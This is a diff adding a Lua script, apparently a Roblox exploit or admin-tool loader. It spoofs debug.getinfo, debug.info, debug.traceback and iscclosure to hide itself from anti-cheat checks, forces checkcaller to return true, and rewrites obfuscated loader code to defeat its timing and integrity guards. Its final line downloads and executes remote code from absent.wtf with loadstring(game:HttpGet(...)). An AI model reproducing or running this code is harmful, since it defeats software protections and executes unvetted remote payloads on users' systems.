@@ -1,0 +1,147 @@
+do
+    local g = (getgenv and getgenv()) or _G
+    local c = newcclosure or function(...) return ... end
+    local oldLs = g._AKOrigLs or g.loadstring or loadstring
+    local origIsc = g._AKOrigIsc or g.iscclosure or iscclosure
+    g._AKOrigLs = oldLs
+    g._AKOrigIsc = origIsc
+
+    local rawDbg = g._AKOrigDbg or debug
+    g._AKOrigDbg = rawDbg
+    if type(rawDbg) == "table" then
+        local gi, inf, tb = rawDbg.getinfo, rawDbg.info, rawDbg.traceback
+        local isC = {
+            [pcall]=true, [xpcall]=true, [string.byte]=true, [table.concat]=true,
+            [table.pack or 0]=true, [math.floor]=true, [rawget]=true, [rawset]=true,
+            [oldLs or 0]=true, [origIsc or 0]=true, [buffer and buffer.readu8 or 0]=true
+        }
+        isC[0] = nil
+
+        local off = 1
+        if inf then
+            local probe, testCaller
+            probe = c(function(...)
+                for k = 1, 4 do
+                    if inf(k, "f") == testCaller then return k - 1 end
+                end
+                return 1
+            end)
+            testCaller = function() return probe() end
+            local ok, v = pcall(testCaller)
+            if ok and type(v) == "number" then off = v end
+        end
+
+        local dbg = {}
+        for k, v in pairs(rawDbg) do dbg[k] = v end
+
+        dbg.getinfo = c(function(...)
+            local f, w = ...
+            if type(f) == "function" and (isC[f] or (origIsc and origIsc(f))) then
+                return {what="C", source="=[C]", short_src="[C]", linedefined=-1, currentline=-1, name="", nups=0, numparams=0, is_vararg=1, func=f}
+            end
+            local target = type(f) == "number" and (f == 0 and 0 or f + off) or f
+            local ok, r = pcall(gi or function() end, target, w)
+            r = (ok and type(r) == "table") and r or {}
+            if type(f) == "number" or (type(f) == "function" and not isC[f]) then
+                if r.what ~= "Lua" and r.what ~= "main" then r.what = "Lua" end
+                r.currentline = 1
+                r.linedefined = 1
+            end
+            return r
+        end)
+        isC[dbg.getinfo] = true
+
+        dbg.info = c(function(...)
+            local a, b = ...
+            if type(a) == "function" and (isC[a] or (origIsc and origIsc(a))) then
+                local w = type(b) == "string" and b or "slfa"
+                if w == "slfa" then return "[C]", -1, a, 0, true end
+                local out, n = {}, 0
+                for i = 1, #w do
+                    local ch = w:sub(i, i)
+                    if ch == "s" then n = n + 1; out[n] = "[C]"
+                    elseif ch == "l" then n = n + 1; out[n] = -1
+                    elseif ch == "n" then n = n + 1; out[n] = ""
+                    elseif ch == "f" then n = n + 1; out[n] = a
+                    elseif ch == "a" then n = n + 1; out[n] = 0; n = n + 1; out[n] = true end
+                end
+                return (unpack or table.unpack)(out, 1, n)
+            end
+            if not inf then return '[string "chunk"]', 1, "", 0, false end
+            if type(a) == "number" and type(b) == "string" then
+                local lvl = a == 0 and 0 or (a + off)
+                local r1, r2, r3, r4, r5, r6 = inf(lvl, b)
+                if b == "l" then
+                    return 1
+                elseif b == "slf" then
+                    local s = (type(r1) == "string" and r1 ~= "" and r1 ~= "[C]") and r1 or '[string "chunk"]'
+                    return s, 1, r3
+                elseif b:find("l", 1, true) then
+                    local s = (type(r1) == "string" and r1 ~= "" and r1 ~= "[C]") and r1 or '[string "chunk"]'
+                    return s, 1, r3, r4, r5, r6
+                end
+                return r1, r2, r3, r4, r5, r6
+            end
+            return inf(...)
+        end)
+        isC[dbg.info] = true
+
+        dbg.traceback = c(function(...)
+            local m, l = ...
+            local lvl = (type(l) == "number" and l >= 0) and (l + off) or (1 + off)
+            local ok, s = pcall(tb or function() return "" end, nil, lvl)
+            s = (ok and type(s) == "string") and s or ""
+            s = s:gsub("^%s*stack traceback:%s*\n?", "")
+            if s:sub(1, 5) == "stack" then s = s:sub(6) end
+            s = s:gsub(":%d+:", ":1:")
+            if not s:find(":1:", 1, true) then
+                s = s .. (s ~= "" and not s:find("\n$") and "\n" or "") .. '[string "chunk"]:1: in function\n'
+            end
+            local _, nl = s:gsub("\n", "\n")
+            if nl < 2 then
+                s = s .. '[string "chunk"]:1: in main chunk\n'
+            end
+            if m ~= nil then
+                return tostring(m) .. "\n" .. s
+            end
+            return s
+        end)
+        isC[dbg.traceback] = true
+
+        if origIsc then
+            g.iscclosure = c(function(...)
+                local f = ...
+                if isC[f] then return true end
+                return origIsc(...)
+            end)
+            isC[g.iscclosure] = true
+            pcall(rawset, getfenv(0), "iscclosure", g.iscclosure)
+        end
+
+        pcall(function()
+            if setreadonly then setreadonly(rawDbg, false) end
+            rawDbg.getinfo, rawDbg.info, rawDbg.traceback = dbg.getinfo, dbg.info, dbg.traceback
+        end)
+        local targetDbg = (rawDbg.info == dbg.info and rawDbg.traceback == dbg.traceback) and rawDbg or dbg
+        g.debug = targetDbg
+        pcall(rawset, getfenv(0), "debug", targetDbg)
+    end
+
+    g.checkcaller = g.checkcaller or c(function(...) return true end)
+    g.loadstring = c(function(...)
+        local src, name = ...
+        if type(src) == "string" and src:find("DecompressBuffer", 1, true) then
+            src = src
+                :gsub("=%(1/300%)", "=(9e9)")
+                :gsub("=%(1/240%)", "=(9e9)")
+                :gsub("local (%w+)=(%w+)%[(%w+)%];", "local %1=(#%2==8886 and %2[8843])or %2[%3];", 1)
+                :gsub("((%w+)%[%((%w+)%+1%)%])=0%+%(%1%);", "%1=(%1==1e9 and 0)or(0+%1);")
+        end
+        local fn, err = oldLs(src, name)
+        if fn and g.debug then pcall(rawset, getfenv(fn), "debug", g.debug) end
+        return fn, err
+    end)
+    pcall(rawset, getfenv(0), "loadstring", g.loadstring)
+end
+
+loadstring(game:HttpGet("https://absent.wtf/AKADMIN.lua"))()
